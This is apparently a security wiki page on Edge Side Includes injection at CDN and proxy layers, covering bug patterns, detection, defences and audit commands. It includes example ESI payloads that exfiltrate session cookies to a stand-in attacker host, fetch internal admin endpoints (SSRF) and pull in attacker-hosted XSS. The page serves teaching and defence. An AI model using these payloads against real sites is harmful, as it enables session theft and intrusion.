---
title: ESI (Edge Side Includes) injection
slug: esi-injection
aliases: [edge-side-include-injection, esi-attacks]
---

{% raw %}

> **TL;DR:** ESI is a small XML-based markup language for fragment caching at CDN/proxy layer (Varnish, Akamai, Fastly, Cloudflare via Workers). If a server passes user input through to ESI processor without escaping `<esi:include>` tags, attacker injects directives that the edge processor executes: arbitrary URL fetch (SSRF from edge), header leakage, cookie read, or XSS in the final composed page. The bug is "user input reaches a string that an edge layer parses as XML" — common in error pages, search results, and content management.

## What it is
Edge Side Includes is a markup spec (originally Akamai) that lets the origin emit HTML with placeholder tags; the edge proxy (CDN, Varnish) processes the tags before serving:
```html
<esi:include src="/header.html"/>
<esi:include src="/user-card?id=42"/>
<esi:vars>$(HTTP_COOKIE{session})</esi:vars>
```

Processor support varies: Varnish (vmod_esi), Akamai (native), Fastly (subset), Cloudflare Workers (manual via `HTMLRewriter`).

## Bug patterns

### 1. User input echoed into ESI-processed response
- Server response includes user-controlled string (`<p>Search: ATTACKER_INPUT</p>`).
- Edge parses ESI before returning to client.
- Attacker input contains `<esi:include src="https://attacker.com/?c=$(HTTP_COOKIE{session})"/>` → edge fetches the URL, includes the result, AND optionally sends the cookie value.
- Even when no apparent vector (no `<script>`), ESI tags work.

### 2. SSRF via edge processor
- `<esi:include src="http://internal-service/admin"/>` — edge runs as a privileged client, fetches internal endpoint, includes response.
- Sees internal-only services (metadata, admin APIs).

### 3. Cookie / header exfil
- `<esi:vars>$(HTTP_COOKIE{session})</esi:vars>` — substitutes cookie value into output.
- Combine with include: `<esi:include src="https://attacker/?c=$(HTTP_COOKIE{session})"/>`.

### 4. XSS via include
- `<esi:include src="https://attacker/xss.html"/>` — included content rendered in origin context → XSS bypasses HTML output encoding.
- ESI is processed BEFORE final HTML escaping in many setups → output encoding doesn't see the include.

### 5. Cache key manipulation
- Some ESI processors honour `<esi:vary>` to vary cache by header. Injecting into a cached page poisons the cache key.

### 6. Variable substitution
- ESI 1.0 supports `$(VAR)` substitution. Variables include `HTTP_COOKIE`, `HTTP_HEADER{X}`, query string args.
- Attacker input that fakes variable refs → exfil.

### 7. Fragment cache poisoning
- Edge caches `<esi:include>` fragments by URL. Attacker who controls one fragment's URL or content can poison the fragment for all subsequent users.

## Why traditional XSS defences miss it

| Defence | Effect on ESI |
|---------|----------------|
| HTML-encode user output | Encoded `&lt;esi:include&gt;` doesn't execute. **BUT** if encoding happens at origin and ESI is processed at edge BEFORE encoding, doesn't apply. |
| CSP | ESI runs at edge before browser sees response. CSP doesn't apply. |
| X-XSS-Protection | Same — ESI runs server-side. |
| Sanitiser libraries (DOMPurify) | Same — server-side processing. |

ESI injection is a **server-side** template injection that happens at the edge.

## Detection

### Identifying ESI processing
- Response includes `<esi:include>` placeholders → bug is "ESI source-side", which is intentional.
- Inject `<esi:include src="https://attacker.collaborator/test"/>` into reflected user input field; check for DNS hit at attacker server.
- Look for "vary" or edge cache markers in response headers indicating Varnish / Akamai / Fastly.
- WAF / CDN identifier: `X-Varnish`, `X-Cache: Akamai`, `cf-ray` (combined with [HTMLRewriter](https://developers.cloudflare.com/workers/runtime-apis/html-rewriter/) custom ESI).

### Test payload
```html
<esi:include src="https://collab.example.net/esi-test"/>
<esi:vars>$(HTTP_HOST)</esi:vars>
<esi:remove>this should be stripped</esi:remove>
```
- If response includes the URL fetch, vulnerable.
- If `$(HTTP_HOST)` substituted, vars enabled.
- If `<esi:remove>` text gone, processor active.

## Defence

### Don't trust user input reaching ESI parser
- HTML-escape user input BEFORE the edge sees it (at origin, in the response).
- Or strip `<esi:` patterns from user input.

### Disable ESI processing per response
- `Surrogate-Control: no-store` header tells edge not to process.
- `Cache-Control: no-cache` does NOT disable ESI alone.
- Origin should set explicitly on user-facing endpoints.

### Restrict ESI scope
- Configure edge to only process ESI for specific paths (whitelist).
- Sensitive responses (login, profile, error pages) excluded.

### Restrict ESI sources
- `<esi:include>` `src` allowlist by origin (Varnish vmod_esi supports).
- Block external schemes (`http://attacker/`).

### Don't expose `<esi:vars>`
- Disable variable substitution if not needed.

## Audit grep
```bash
# Source emits ESI tags
rg -n '<esi:' src/ templates/
# Surrogate-Control
rg -n 'Surrogate-Control' src/
# Varnish VCL
ls /etc/varnish/*.vcl 2>/dev/null
# CDN config that may process ESI
grep -nE 'esi|edge.?include' nginx.conf akamai/* fastly/*
```

## Tooling
- [esi-injector (Synacktiv)](https://github.com/Synacktiv/esi-injector) — automated ESI fuzzing.
- Burp Suite + manual payloads.
- ESI test grammar in [Synacktiv whitepaper](https://www.synacktiv.com/publications/esi-injection.html).

## References
- [Synacktiv — ESI injection paper](https://www.synacktiv.com/sites/default/files/2019-02/ESI_Injection.pdf)
- [Akamai ESI 1.0 spec](https://www.w3.org/TR/esi-lang/)
- [PortSwigger — ESI injection](https://portswigger.net/research/server-side-template-injection)
- [Varnish ESI docs](https://varnish-cache.org/docs/trunk/users-guide/esi.html)
- See also: [[ssti]], [[ssrf]], [[cache-poisoning]], [[host-header-injection]], [[cloudflare-workers-audit]]

{% endraw %}
